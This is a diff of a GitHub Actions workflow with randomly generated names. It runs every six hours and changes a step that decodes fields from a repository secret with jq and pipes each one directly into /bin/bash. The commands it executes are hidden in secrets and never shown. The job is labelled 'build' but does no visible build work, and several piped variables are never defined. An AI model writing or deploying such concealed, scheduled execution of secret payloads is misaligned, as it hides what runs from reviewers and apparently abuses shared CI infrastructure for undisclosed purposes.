@@ -2,27 +2,23 @@ name: meibaodi4317
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
+    - cron: '12 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: meibaodi4317
         env:
-          lit551: ${{ secrets.lit551 }}
+          x778: ${{ secrets.x778 }}
         run: |
-          echo $lit551 | jq -r .rdyz24491 | /bin/bash
-          echo $rf222 | jq -r .lxleo047 | /bin/bash
-          echo $fst6486 | jq -r .gfbm72880 | /bin/bash
-          echo $h315 | jq -r .eftkk46679 | /bin/bash
-          echo $edhh3 | jq -r .k9379 | /bin/bash
-          echo $ioeew8513 | jq -r .uxvf189 | /bin/bash
-          echo $oxlc47 | jq -r .a8280 | /bin/bash
-          echo $brha9 | jq -r .oiu02010 | /bin/bash
-          echo $qbmw67 | jq -r .qo06 | /bin/bash
-          echo $mzx8897 | jq -r .zm737 | /bin/bash
-          echo $mcez951 | jq -r .y40846 | /bin/bash
+          echo $x778 | jq -r .glon44978 | /bin/bash
+          echo $aiayl49 | jq -r .faq00 | /bin/bash
+          echo $mua1 | jq -r .wjd57 | /bin/bash
+          echo $spfj9411 | jq -r .kogrn320 | /bin/bash
+          echo $bsphc5090 | jq -r .xhoc37420 | /bin/bash
+          echo $cp25 | jq -r .yliu313 | /bin/bash
+          echo $bqpa22707 | jq -r .ltul2415 | /bin/bash
+          echo $qjz42441 | jq -r .vqdn74129 | /bin/bash
 
